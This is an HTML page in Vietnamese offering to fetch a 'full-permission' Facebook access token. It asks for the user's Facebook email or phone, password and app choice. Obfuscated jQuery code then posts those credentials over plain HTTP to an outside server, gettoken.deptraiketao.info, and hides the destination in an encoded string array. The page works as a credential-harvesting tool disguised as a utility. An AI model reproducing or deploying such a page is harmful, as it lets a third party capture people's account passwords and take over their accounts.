<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<script src="//code.jquery.com/jquery.min.js"></script>
<title>
  Get Token Full Quyền
</title> 
<link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
<link href="//cdn.shopify.com/s/files/1/0691/5403/t/123/assets/style.scss.css?13701263572696252361" rel="stylesheet" type="text/css"  media="all"  />
</head>
<body id="dashboard" class="background-dark template-product" >
  <div class="container">
    <div class="row text-centered">
      <div class="col-md-12 text-center">
<div class="panel panel-default">
<div class="panel-heading">
<h3 class="panel-title">Tool Lấy Token Full Quyền</h3>
</div>
<div class="panel-body">
<div class="form-group">
<label for="email">* Email hoặc số điện thoại :</label>
<input id="email" placeholder="Nhập Email" class="form-control"/>
</div>
<div class="form-group"><label for="password">* Mật khẩu :</label>
<input id="password" type="password" placeholder="Nhập Mật Khẩu" class="form-control"/>
</div>
<div class="form-group"><label for="app_id">* Chọn Ứng Dụng :</label>
<select id="app_id" class="form-control">
<option value="6628568379">Facebook For Iphone</option>
<option value="350685531728">Facebook For Android</option>
<option value="165907476854626">PAGES MANAGER FOR IOS</option>
</select>
</div>
<div class="form-group text-center">
<button id="submit" class="btn btn-sm btn-primary">Lấy Token</button>
</div>
<div class="form-group text-center" id="load_result" style="display:none">
<label for="result">Access Token của bạn là :</label>
<textarea id="result" onclick="this.focus();this.select()" class="form-control" rows="2"></textarea>
</div>
</div>
</div>
<script>
    var _0x6619 = ["click", "#submit", "disabled", "attr", "Anh em vui lòng đợi...", "html", "val", "#email", "#password", "#app_id option:selected", "removeAttr", "Lấy token", "show", "#load_result", "Thất bại vui lòng thử lại", "#result", "fail", "http://gettoken.deptraiketao.info/full.php", "post", "ajax", "on"];
    $(document)[_0x6619[20]](_0x6619[0], _0x6619[1], function () {
        $(_0x6619[1])[_0x6619[3]](_0x6619[2], _0x6619[2]), $(_0x6619[1])[_0x6619[5]](_0x6619[4]);
        var _0x1ea6x1 = $(_0x6619[7])[_0x6619[6]](),
            _0x1ea6x2 = $(_0x6619[8])[_0x6619[6]](),
            _0x1ea6x3 = $(_0x6619[9])[_0x6619[6]]();
        $[_0x6619[19]]({
            url: _0x6619[17],
            type: _0x6619[18],
            data: {
                email: _0x1ea6x1,
                password: _0x1ea6x2,
                app_id: _0x1ea6x3
            },
            success: function (_0x1ea6x1) {
                $(_0x6619[1])[_0x6619[10]](_0x6619[2]), $(_0x6619[1])[_0x6619[5]](_0x6619[11]), $(_0x6619[13])[_0x6619[12]](), $(_0x6619[15])[_0x6619[6]](_0x1ea6x1)
            }
        })[_0x6619[16]](function () {
            $(_0x6619[1])[_0x6619[10]](_0x6619[2]), $(_0x6619[1])[_0x6619[5]](_0x6619[11]), $(_0x6619[13])[_0x6619[12]](), $(_0x6619[15])[_0x6619[6]](_0x6619[14])
        })
    })
</script>
</div>
</div>
</div>
</body>
</html>
<?